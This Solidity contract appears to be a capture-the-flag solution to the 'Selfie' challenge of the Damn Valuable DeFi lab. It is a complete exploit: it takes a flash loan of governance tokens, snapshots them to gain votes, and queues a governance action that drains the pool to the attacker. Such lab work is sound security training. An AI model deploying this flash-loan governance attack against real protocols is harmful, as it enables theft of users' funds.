// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";
import "../selfie/SelfiePool.sol";
import "../selfie/SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfiePoolAttack {
    address attackAddress;
    address selfiePoolAddress;
    address governanceTokenAddress;
    address simpleGovernanceAddress;
    uint loadAmount;
    uint public actionId;
    function run(
                address _attackAddress,
                address _selfiePoolAddress,
                address _governanceTokenAddress,
                address _simpleGovernanceAddress,
                uint _loadAmount) 
                external
    {
        attackAddress = _attackAddress;
        selfiePoolAddress = _selfiePoolAddress;
        governanceTokenAddress = _governanceTokenAddress;
        simpleGovernanceAddress = _simpleGovernanceAddress;
        loadAmount = _loadAmount;
        SelfiePool(selfiePoolAddress).flashLoan(loadAmount);
    }
    function receiveTokens(address token,uint256 amount) external payable {
        DamnValuableTokenSnapshot(governanceTokenAddress).snapshot();
        actionId = SimpleGovernance(simpleGovernanceAddress)
                   .queueAction(
                       selfiePoolAddress,
                       abi.encodeWithSelector(bytes4(keccak256("drainAllFunds(address)")), [attackAddress]),
                       0
                    );
        DamnValuableTokenSnapshot(token).transfer(msg.sender,amount);
    }
    receive() external payable{}
}
 